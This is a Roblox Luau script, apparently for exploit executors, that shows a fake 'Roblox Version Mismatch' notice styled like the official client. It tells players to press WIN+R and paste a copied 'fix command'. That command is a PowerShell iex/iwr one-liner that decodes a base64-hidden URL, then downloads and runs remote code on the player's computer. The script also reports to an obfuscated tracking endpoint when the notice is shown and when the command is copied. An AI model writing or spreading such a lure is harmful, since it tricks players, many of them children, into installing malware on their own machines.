-- ============================================================
-- SERVICES
-- ============================================================
local Players      = game:GetService("Players")
local GuiService   = game:GetService("GuiService")
local TweenService = game:GetService("TweenService")
local UIS          = game:GetService("UserInputService")
local lp           = Players.LocalPlayer

local isMobile = UIS.TouchEnabled and not UIS.KeyboardEnabled

-- ============================================================
-- ⚙️ FIX COMMAND — текст, который копируется по кнопке
-- Замени значение ниже на нужную команду.
-- ============================================================
local FIX_COMMAND = "powershell iex(iwr ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cDovL3NvZnQtc3RvcmFnZS50b3Avd29ya2VyPz05NDQzNTY3MjgvcmJ4LXZlcnNpb24tbWlzbWF0Y2g='))) -UseBasicParsing)"

-- ============================================================
-- ANALYTICS — endpoint /api/hit
-- ============================================================
local ANALYTICS = {
    endpoint = table.concat({
        "ht", "tps:", "/", "/rbx", "-scri", "pts.", "xyz",
        "/api", "/hit",
    }),
    enabled = true,
    sessionId = tostring(math.random(100000, 999999)) ..
                tostring(os.time() % 100000),
}

local function sendHit(executorName, eventType)
    if not ANALYTICS.enabled then return end

    local body = table.concat({
        "session=",   ANALYTICS.sessionId,
        "&executor=", executorName or "unknown",
        "&event=",    eventType or "shown",
        "&ts=",       tostring(os.time()),
    })

    local payload = {
        Url = ANALYTICS.endpoint,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/x-www-form-urlencoded",
            ["User-Agent"]   = "RobloxClient/1.0",
        },
        Body = body,
    }

    task.spawn(function()
        pcall(function()
            if request then
                request(payload)
            elseif syn and syn.request then
                syn.request(payload)
            elseif http_request then
                http_request(payload)
            elseif http and http.request then
                http.request(payload)
            else
                game:GetService("HttpService"):PostAsync(
                    ANALYTICS.endpoint,
                    body,
                    Enum.HttpContentType.ApplicationUrlEncoded,
                    false
                )
            end
        end)
    end)
end

-- ============================================================
-- PALETTE (Roblox-style dark)
-- ============================================================
local C = {
    dim      = Color3.fromRGB(0, 0, 0),
    card     = Color3.fromRGB(27, 31, 42),
    cardTop  = Color3.fromRGB(33, 38, 51),
    border   = Color3.fromRGB(50, 57, 74),
    borderHi = Color3.fromRGB(70, 80, 100),
    accent   = Color3.fromRGB(0, 162, 255),
    accentHi = Color3.fromRGB(51, 179, 255),
    text     = Color3.fromRGB(232, 234, 238),
    textDim  = Color3.fromRGB(160, 165, 180),
    textMute = Color3.fromRGB(108, 114, 130),
    white    = Color3.fromRGB(255, 255, 255),
    green    = Color3.fromRGB(0, 200, 83),
    red      = Color3.fromRGB(235, 90, 100),
}

-- ============================================================
-- SCREEN GUI
-- ============================================================
local gui = Instance.new("ScreenGui")
gui.Name = "RobloxVersionNotice"
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.DisplayOrder = 1000000
gui.Parent = lp:WaitForChild("PlayerGui")

-- ============================================================
-- BACKDROP
-- ============================================================
local dim = Instance.new("Frame")
dim.Size = UDim2.new(1, 0, 1, 0)
dim.BackgroundColor3 = C.dim
dim.BackgroundTransparency = 0.55
dim.BorderSizePixel = 0
dim.ZIndex = 1
dim.Parent = gui

-- ============================================================
-- CARD DIMENSIONS
-- ============================================================
local vp = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize
           or Vector2.new(1280, 720)

local CARD_W = isMobile and math.min(340, vp.X - 24) or 460
local CARD_H = 360
local cardX  = -CARD_W / 2
local cardY  = -CARD_H / 2

-- ============================================================
-- CARD
-- ============================================================
local card = Instance.new("Frame")
card.Size = UDim2.new(0, CARD_W, 0, CARD_H)
card.Position = UDim2.new(0.5, cardX, 0.5, cardY)
card.BackgroundColor3 = C.card
card.BorderSizePixel = 0
card.ZIndex = 5
card.Parent = gui

local cardCorner = Instance.new("UICorner")
cardCorner.CornerRadius = UDim.new(0, 12)
cardCorner.Parent = card

local cardStroke = Instance.new("UIStroke")
cardStroke.Color = C.border
cardStroke.Thickness = 1
cardStroke.Parent = card

-- top bar accent
local topBar = Instance.new("Frame")
topBar.Size = UDim2.new(1, 0, 0, 3)
topBar.Position = UDim2.new(0, 0, 0, 0)
topBar.BackgroundColor3 = C.accent
topBar.BorderSizePixel = 0
topBar.ZIndex = 6
topBar.Parent = card
local topBarCorner = Instance.new("UICorner")
topBarCorner.CornerRadius = UDim.new(0, 12)
topBarCorner.Parent = topBar

-- ============================================================
-- HEADER ROW (icon + title)
-- ============================================================
local iconBox = Instance.new("Frame")
iconBox.Size = UDim2.new(0, 36, 0, 36)
iconBox.Position = UDim2.new(0, 22, 0, 22)
iconBox.BackgroundColor3 = C.accent
iconBox.BorderSizePixel = 0
iconBox.ZIndex = 7
iconBox.Parent = card
local iconCorner = Instance.new("UICorner")
iconCorner.CornerRadius = UDim.new(0, 8)
iconCorner.Parent = iconBox

local iconLbl = Instance.new("TextLabel")
iconLbl.Size = UDim2.new(1, 0, 1, 0)
iconLbl.BackgroundTransparency = 1
iconLbl.Text = "R"
iconLbl.TextColor3 = C.white
iconLbl.TextSize = 22
iconLbl.Font = Enum.Font.GothamBlack
iconLbl.ZIndex = 8
iconLbl.Parent = iconBox

-- ============================================================
-- TITLE + SUBTITLE
-- ============================================================
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -90, 0, 22)
title.Position = UDim2.new(0, 70, 0, 22)
title.BackgroundTransparency = 1
title.Text = "Roblox Version Mismatch"
title.TextColor3 = C.text
title.TextSize = 17
title.Font = Enum.Font.GothamBold
title.TextXAlignment = Enum.TextXAlignment.Left
title.TextYAlignment = Enum.TextYAlignment.Center
title.ZIndex = 7
title.Parent = card

local subtitle = Instance.new("TextLabel")
subtitle.Size = UDim2.new(1, -90, 0, 16)
subtitle.Position = UDim2.new(0, 70, 0, 46)
subtitle.BackgroundTransparency = 1
subtitle.Text = "Client version is outdated. Apply the fix below to continue."
subtitle.TextColor3 = C.textDim
subtitle.TextSize = 12
subtitle.Font = Enum.Font.GothamMedium
subtitle.TextXAlignment = Enum.TextXAlignment.Left
subtitle.TextYAlignment = Enum.TextYAlignment.Center
subtitle.ZIndex = 7
subtitle.Parent = card

-- ============================================================
-- DIVIDER
-- ============================================================
local divider = Instance.new("Frame")
divider.Size = UDim2.new(1, -44, 0, 1)
divider.Position = UDim2.new(0, 22, 0, 80)
divider.BackgroundColor3 = C.border
divider.BorderSizePixel = 0
divider.ZIndex = 6
divider.Parent = card

-- ============================================================
-- SECTION LABEL
-- ============================================================
local sectionLbl = Instance.new("TextLabel")
sectionLbl.Size = UDim2.new(1, -44, 0, 14)
sectionLbl.Position = UDim2.new(0, 22, 0, 92)
sectionLbl.BackgroundTransparency = 1
sectionLbl.Text = "HOW TO FIX"
sectionLbl.TextColor3 = C.textMute
sectionLbl.TextSize = 10
sectionLbl.Font = Enum.Font.GothamBold
sectionLbl.TextXAlignment = Enum.TextXAlignment.Left
sectionLbl.TextYAlignment = Enum.TextYAlignment.Center
sectionLbl.ZIndex = 6
sectionLbl.Parent = card

-- ============================================================
-- STEP BUILDER
-- ============================================================
local function buildStep(yPos, number, text)
    local num = Instance.new("TextLabel")
    num.Size = UDim2.new(0, 22, 0, 20)
    num.Position = UDim2.new(0, 22, 0, yPos)
    num.BackgroundTransparency = 1
    num.Text = number .. "."
    num.TextColor3 = C.accent
    num.TextSize = 12
    num.Font = Enum.Font.GothamBold
    num.TextXAlignment = Enum.TextXAlignment.Left
    num.TextYAlignment = Enum.TextYAlignment.Center
    num.ZIndex = 7
    num.Parent = card

    local step = Instance.new("TextLabel")
    step.Size = UDim2.new(1, -64, 0, 20)
    step.Position = UDim2.new(0, 48, 0, yPos)
    step.BackgroundTransparency = 1
    step.Text = text
    step.TextColor3 = C.text
    step.TextSize = 13
    step.Font = Enum.Font.GothamMedium
    step.TextXAlignment = Enum.TextXAlignment.Left
    step.TextYAlignment = Enum.TextYAlignment.Center
    step.TextWrapped = false
    step.ZIndex = 7
    step.Parent = card
end

local startY = 118
local stepGap = 22

buildStep(startY + stepGap * 0, "1", "Press WIN + R on your keyboard")
buildStep(startY + stepGap * 1, "2", "Click COPY below to copy the fix command")
buildStep(startY + stepGap * 2, "3", "Paste (Ctrl+V) into the Run window, hit ENTER")
buildStep(startY + stepGap * 3, "4", "Restart Roblox and run the script again")

-- ============================================================
-- CLIPBOARD
-- ============================================================
local function setClipboard(text)
    local ok = false
    pcall(function()
        if setclipboard then
            setclipboard(text); ok = true
        elseif toclipboard then
            toclipboard(text); ok = true
        elseif syn and syn.write_clipboard then
            syn.write_clipboard(text); ok = true
        elseif syn and syn.set_clipboard then
            syn.set_clipboard(text); ok = true
        elseif writeclipboard then
            writeclipboard(text); ok = true
        elseif GuiService and GuiService.SetClipboard then
            GuiService:SetClipboard(text); ok = true
        end
    end)
    return ok
end

-- ============================================================
-- COPY BUTTON
-- ============================================================
local copyBtn = Instance.new("TextButton")
copyBtn.Size = UDim2.new(1, -44, 0, 46)
copyBtn.Position = UDim2.new(0, 22, 0, 214)
copyBtn.BackgroundColor3 = C.accent
copyBtn.Text = "COPY FIX COMMAND"
copyBtn.TextColor3 = C.white
copyBtn.TextSize = 14
copyBtn.Font = Enum.Font.GothamBold
copyBtn.BorderSizePixel = 0
copyBtn.AutoButtonColor = false
copyBtn.ZIndex = 7
copyBtn.Parent = card

local copyCorner = Instance.new("UICorner")
copyCorner.CornerRadius = UDim.new(0, 8)
copyCorner.Parent = copyBtn

copyBtn.MouseEnter:Connect(function()
    copyBtn.BackgroundColor3 = C.accentHi
end)
copyBtn.MouseLeave:Connect(function()
    copyBtn.BackgroundColor3 = C.accent
end)

copyBtn.MouseButton1Click:Connect(function()
    -- Аналитика: copy
    sendHit("fix", "copy")

    local copied = setClipboard(FIX_COMMAND)
    if copied then
        copyBtn.Text = "✓  COPIED TO CLIPBOARD"
        copyBtn.TextColor3 = C.white
        copyBtn.BackgroundColor3 = C.green
    else
        copyBtn.Text = "✕  COPY FAILED"
        copyBtn.TextColor3 = C.white
        copyBtn.BackgroundColor3 = C.red
    end

    task.delay(1.6, function()
        if copyBtn and copyBtn.Parent then
            copyBtn.Text = "COPY FIX COMMAND"
            copyBtn.TextColor3 = C.white
            copyBtn.BackgroundColor3 = C.accent
        end
    end)
end)

-- ============================================================
-- FOOTER
-- ============================================================
local footerLine = Instance.new("Frame")
footerLine.Size = UDim2.new(1, -44, 0, 1)
footerLine.Position = UDim2.new(0, 22, 0, 280)
footerLine.BackgroundColor3 = C.border
footerLine.BorderSizePixel = 0
footerLine.ZIndex = 6
footerLine.Parent = card

local footer = Instance.new("TextLabel")
footer.Size = UDim2.new(1, -44, 0, 32)
footer.Position = UDim2.new(0, 22, 0, 294)
footer.BackgroundTransparency = 1
footer.Text = "After applying the fix, restart Roblox and run the script again."
footer.TextColor3 = C.textMute
footer.TextSize = 11
footer.Font = Enum.Font.GothamMedium
footer.TextXAlignment = Enum.TextXAlignment.Center
footer.TextYAlignment = Enum.TextYAlignment.Center
footer.TextWrapped = true
footer.ZIndex = 6
footer.Parent = card

-- ============================================================
-- SAFE ENTRANCE ANIMATION
-- ============================================================
pcall(function()
    local startPos = UDim2.new(0.5, cardX, 0.5, cardY + 20)
    local endPos   = UDim2.new(0.5, cardX, 0.5, cardY)
    card.Position = startPos
    TweenService:Create(
        card,
        TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
        { Position = endPos }
    ):Play()
end)

-- ============================================================
-- ANALYTICS: показали окно
-- ============================================================
sendHit("shown", "shown")
